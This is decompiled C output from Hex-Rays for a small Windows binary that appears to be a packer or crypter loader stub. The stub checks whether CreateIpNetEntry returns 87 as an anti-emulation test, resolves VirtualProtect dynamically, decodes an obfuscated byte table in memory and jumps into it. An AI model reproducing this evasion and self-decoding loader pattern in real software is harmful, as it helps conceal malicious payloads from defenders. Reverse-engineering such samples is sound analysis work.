/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

unsigned __int8 *__stdcall sub_40A196(unsigned __int8 *, int, unsigned __int8 *);
FARPROC __stdcall sub_40A1FC(LPCSTR lpLibFileName, LPCSTR lpProcName);
unsigned __int8 *sub_40A214();
void __noreturn start(); // weak
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// DWORD __stdcall GetVersion();
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

//-------------------------------------------------------------------------
// Data declarations

int dword_401000[2] = { 0, 0 }; // weak
_UNKNOWN loc_409268; // weak
int dword_40C070 = 37258; // weak
unsigned __int8 byte_40C074[790] =
{
  40u,
  29u,
  246u,
  164u,
  192u,
  87u,
  74u,
  218u,
  68u,
  51u,
  163u,
  127u,
  3u,
  255u,
  243u,
  26u,
  108u,
  234u,
  124u,
  76u,
  65u,
  225u,
  214u,
  202u,
  84u,
  96u,
  73u,
  100u,
  79u,
  237u,
  201u,
  27u,
  56u,
  66u,
  215u,
  129u,
  160u,
  134u,
  67u,
  120u,
  197u,
  165u,
  86u,
  88u,
  28u,
  183u,
  143u,
  117u,
  92u,
  17u,
  210u,
  57u,
  19u,
  149u,
  153u,
  208u,
  7u,
  140u,
  199u,
  42u,
  55u,
  75u,
  44u,
  1u,
  204u,
  81u,
  89u,
  128u,
  157u,
  194u,
  162u,
  207u,
  106u,
  166u,
  123u,
  60u,
  59u,
  103u,
  181u,
  154u,
  34u,
  170u,
  244u,
  97u,
  112u,
  4u,
  171u,
  230u,
  145u,
  212u,
  54u,
  23u,
  13u,
  144u,
  253u,
  209u,
  203u,
  69u,
  78u,
  221u,
  146u,
  229u,
  0u,
  77u,
  58u,
  242u,
  248u,
  37u,
  71u,
  239u,
  46u,
  137u,
  161u,
  45u,
  180u,
  205u,
  189u,
  213u,
  83u,
  151u,
  178u,
  32u,
  118u,
  102u,
  252u,
  152u,
  104u,
  35u,
  177u,
  136u,
  121u,
  20u,
  114u,
  18u,
  188u,
  21u,
  63u,
  155u,
  49u,
  115u,
  39u,
  36u,
  10u,
  85u,
  195u,
  53u,
  14u,
  148u,
  173u,
  133u,
  159u,
  254u,
  90u,
  172u,
  236u,
  111u,
  64u,
  223u,
  219u,
  130u,
  193u,
  93u,
  224u,
  190u,
  235u,
  150u,
  99u,
  168u,
  250u,
  91u,
  38u,
  22u,
  167u,
  43u,
  50u,
  187u,
  33u,
  138u,
  6u,
  15u,
  2u,
  185u,
  132u,
  156u,
  198u,
  226u,
  110u,
  126u,
  9u,
  41u,
  158u,
  240u,
  233u,
  82u,
  238u,
  70u,
  72u,
  220u,
  95u,
  116u,
  31u,
  200u,
  231u,
  47u,
  122u,
  245u,
  249u,
  16u,
  206u,
  186u,
  191u,
  101u,
  175u,
  94u,
  25u,
  251u,
  30u,
  232u,
  80u,
  135u,
  8u,
  216u,
  174u,
  24u,
  11u,
  176u,
  179u,
  182u,
  48u,
  52u,
  141u,
  222u,
  125u,
  247u,
  5u,
  109u,
  184u,
  169u,
  147u,
  196u,
  228u,
  131u,
  105u,
  142u,
  227u,
  113u,
  241u,
  62u,
  107u,
  98u,
  139u,
  12u,
  211u,
  217u,
  61u,
  119u,
  0u,
  202u,
  14u,
  202u,
  78u,
  138u,
  166u,
  139u,
  42u,
  137u,
  174u,
  174u,
  11u,
  140u,
  206u,
  42u,
  238u,
  140u,
  206u,
  174u,
  238u,
  230u,
  202u,
  11u,
  206u,
  139u,
  202u,
  11u,
  174u,
  44u,
  102u,
  205u,
  11u,
  39u,
  139u,
  39u,
  174u,
  139u,
  198u,
  136u,
  174u,
  136u,
  173u,
  11u,
  206u,
  11u,
  174u,
  39u,
  0u,
  202u,
  170u,
  77u,
  78u,
  110u,
  73u,
  79u,
  138u,
  139u,
  166u,
  102u,
  205u,
  174u,
  238u,
  39u,
  238u,
  72u,
  206u,
  139u,
  110u,
  102u,
  140u,
  75u,
  238u,
  172u,
  39u,
  4u,
  41u,
  78u,
  139u,
  42u,
  137u,
  174u,
  174u,
  11u,
  140u,
  206u,
  237u,
  11u,
  174u,
  39u,
  102u,
  238u,
  140u,
  139u,
  202u,
  200u,
  39u,
  206u,
  11u,
  173u,
  79u,
  11u,
  39u,
  206u,
  238u,
  174u,
  11u,
  0u,
  77u,
  102u,
  174u,
  39u,
  206u,
  79u,
  137u,
  140u,
  0u,
  7u,
  102u,
  39u,
  136u,
  108u,
  230u,
  11u,
  202u,
  79u,
  0u,
  202u,
  14u,
  202u,
  78u,
  138u,
  166u,
  139u,
  42u,
  137u,
  174u,
  174u,
  11u,
  140u,
  206u,
  42u,
  238u,
  140u,
  206u,
  174u,
  238u,
  230u,
  202u,
  11u,
  206u,
  139u,
  42u,
  238u,
  140u,
  206u,
  174u,
  238u,
  230u,
  139u,
  202u,
  11u,
  39u,
  39u,
  102u,
  238u,
  140u,
  4u,
  166u,
  136u,
  140u,
  136u,
  234u,
  11u,
  174u,
  139u,
  73u,
  40u,
  40u,
  42u,
  11u,
  174u,
  206u,
  7u,
  230u,
  230u,
  39u,
  0u,
  73u,
  40u,
  40u,
  202u,
  11u,
  205u,
  7u,
  230u,
  230u,
  0u,
  139u,
  140u,
  11u,
  230u,
  43u,
  233u,
  197u,
  75u,
  230u,
  230u,
  0u,
  139u,
  137u,
  39u,
  11u,
  174u,
  43u,
  233u,
  197u,
  75u,
  230u,
  230u,
  0u,
  139u,
  173u,
  11u,
  173u,
  238u,
  174u,
  200u,
  197u,
  206u,
  173u,
  40u,
  0u,
  140u,
  206u,
  75u,
  230u,
  230u,
  197u,
  75u,
  230u,
  230u,
  0u,
  171u,
  88u,
  8u,
  0u,
  172u,
  146u,
  50u,
  133u,
  196u,
  221u,
  240u,
  90u,
  100u,
  63u,
  109u,
  179u,
  66u,
  237u,
  113u,
  223u,
  87u,
  33u,
  9u,
  231u,
  0u,
  0u,
  0u,
  0u,
  142u,
  11u,
  174u,
  140u,
  11u,
  230u,
  43u,
  233u,
  197u,
  75u,
  230u,
  230u,
  0u,
  112u,
  88u,
  8u,
  0u,
  158u,
  162u,
  114u,
  22u,
  10u,
  139u,
  103u,
  105u,
  134u,
  191u,
  245u,
  231u,
  192u,
  28u,
  39u,
  176u,
  26u,
  96u,
  139u,
  33u,
  96u,
  134u,
  16u,
  36u,
  134u,
  161u,
  217u,
  33u,
  187u,
  190u,
  202u,
  185u,
  66u,
  237u,
  61u,
  153u,
  171u,
  13u,
  9u,
  192u,
  129u,
  69u,
  193u,
  61u,
  96u,
  137u,
  119u,
  134u,
  20u,
  254u,
  247u,
  1u,
  44u,
  23u,
  126u,
  56u,
  180u,
  62u,
  143u,
  196u,
  24u,
  186u,
  209u,
  64u,
  130u,
  38u,
  113u,
  100u,
  224u,
  172u,
  35u,
  190u,
  2u,
  134u,
  192u,
  193u,
  255u,
  208u,
  78u,
  23u,
  141u,
  74u,
  228u,
  251u,
  75u,
  42u,
  240u,
  218u,
  138u,
  119u,
  15u,
  28u,
  204u,
  213u,
  248u,
  254u,
  230u,
  82u,
  99u,
  150u,
  177u,
  64u,
  14u,
  187u,
  229u,
  45u,
  115u,
  21u,
  22u,
  192u,
  168u,
  18u,
  255u,
  227u,
  143u,
  57u,
  177u,
  183u,
  56u,
  231u,
  21u,
  189u,
  94u,
  217u,
  133u,
  156u,
  251u,
  198u,
  165u,
  197u,
  2u,
  115u,
  241u,
  100u,
  13u,
  91u,
  181u,
  214u,
  166u,
  48u,
  0u,
  0u,
  0u,
  0u,
  136u,
  75u,
  44u,
  136u,
  40u,
  102u,
  43u,
  233u,
  197u,
  75u,
  230u,
  230u,
  0u,
  132u,
  120u,
  8u,
  0u,
  109u,
  32u,
  37u,
  53u,
  19u,
  205u,
  186u,
  78u,
  223u,
  181u,
  232u,
  22u,
  51u,
  117u,
  161u,
  170u,
  167u,
  23u,
  76u,
  30u,
  0u,
  0u,
  0u,
  0u,
  39u,
  13u,
  11u,
  230u,
  230u,
  43u,
  233u,
  197u,
  75u,
  230u,
  230u,
  0u,
  166u,
  120u,
  8u,
  0u,
  140u,
  211u,
  54u,
  43u,
  0u,
  0u,
  0u,
  0u,
  202u,
  238u,
  72u,
  206u,
  172u,
  136u,
  174u,
  11u,
  139u,
  230u,
  40u,
  238u,
  10u,
  108u,
  76u,
  206u,
  137u,
  206u,
  174u,
  0u,
  139u,
  110u,
  102u,
  140u,
  75u,
  238u,
  172u,
  39u,
  4u,
  202u,
  11u,
  174u,
  44u,
  11u,
  174u,
  0u,
  0u
}; // weak
int dword_40C38A = 0; // weak
CHAR LibFileName[] = { '\0', '\0', '\0', '\0' }; // idb
CHAR ProcName[] = { '\0', '\0', '\0', '\0' }; // idb
CHAR word_40C3D0[3] = { '\0', '\0', 'h' }; // weak
int dword_40C3D3 = 0; // weak
int dword_40C3D7 = 0; // weak
CHAR aCreateipnetent[] = "CreateIpNetEntry"; // idb


//----- (0040A196) --------------------------------------------------------
unsigned __int8 *__stdcall sub_40A196(unsigned __int8 *a1, int a2, unsigned __int8 *a3)
{
  int v5; // ecx
  unsigned __int8 *v6; // edi
  unsigned __int8 *result; // eax
  int v8; // [esp-4h] [ebp-4h]

  do
  {
    v8 = a2;
    v5 = 256;
    v6 = a3;
    do
    {
      if ( *a1 == *v6 )
        break;
      ++v6;
      --v5;
    }
    while ( v5 );
    result = (unsigned __int8 *)(v6 - a3);
    *a1++ = (_BYTE)v6 - (_BYTE)a3;
    a2 = v8 - 1;
  }
  while ( v8 != 1 );
  return result;
}
// 40A196: could not find valid save-restore pair for ebx
// 40A196: could not find valid save-restore pair for esi

//----- (0040A1FC) --------------------------------------------------------
FARPROC __stdcall sub_40A1FC(LPCSTR lpLibFileName, LPCSTR lpProcName)
{
  HMODULE LibraryA; // eax

  LibraryA = LoadLibraryA(lpLibFileName);
  return GetProcAddress(LibraryA, lpProcName);
}

//----- (0040A214) --------------------------------------------------------
unsigned __int8 *sub_40A214()
{
  FARPROC v0; // ebx
  int v2; // [esp-4h] [ebp-14h]
  char v3[12]; // [esp+4h] [ebp-Ch] BYREF

  qmemcpy(ProcName, "VirtualProte", 12);
  qmemcpy(LibFileName, "kernel32", 8);
  v2 = dword_40C070 + 8;
  v0 = sub_40A1FC(LibFileName, ProcName);
  ((void (__stdcall *)(int *, int, int, char *))v0)(dword_401000, v2, 64, v3);
  return sub_40A196((unsigned __int8 *)&dword_401000[2], dword_40C070, byte_40C074);
}
// 401000: using guessed type int dword_401000[2];
// 40C070: using guessed type int dword_40C070;
// 40C074: using guessed type unsigned __int8 byte_40C074[790];
// 40C39C: using guessed type int dword_40C39C;
// 40C3B1: using guessed type int dword_40C3B1;
// 40C3B5: using guessed type int dword_40C3B5;
// 40A214: using guessed type char var_C[12];

//----- (0040A299) --------------------------------------------------------
void __noreturn start()
{
  LPVOID v0; // edx
  FARPROC v1; // eax

  dword_40C38A = (int)VirtualAlloc(0, 0x190u, 0x2000u, 4u);
  GetVersion();
  VirtualFree(v0, 0, 0x8000u);
  dword_40C3D7 = 1818504809;
  *(_WORD *)word_40C3D0 = 28745;
  dword_40C3D3 = 1885433964;
  v1 = sub_40A1FC(word_40C3D0, aCreateipnetent);
  if ( ((int (__stdcall *)(_DWORD))v1)(0) == 87 )
  {
    sub_40A214();
    ((void (*)(void))loc_409268)();
  }
  ExitProcess(0);
}
// 40A2BE: variable 'v0' is possibly undefined
// 40A299: using guessed type void __noreturn start();
// 40C38A: using guessed type int dword_40C38A;
// 40C3D3: using guessed type int dword_40C3D3;
// 40C3D7: using guessed type int dword_40C3D7;

// nfuncs=10 queued=4 decompiled=4 lumina nreq=0 worse=0 better=0
// ALL OK, 4 function(s) have been successfully decompiled
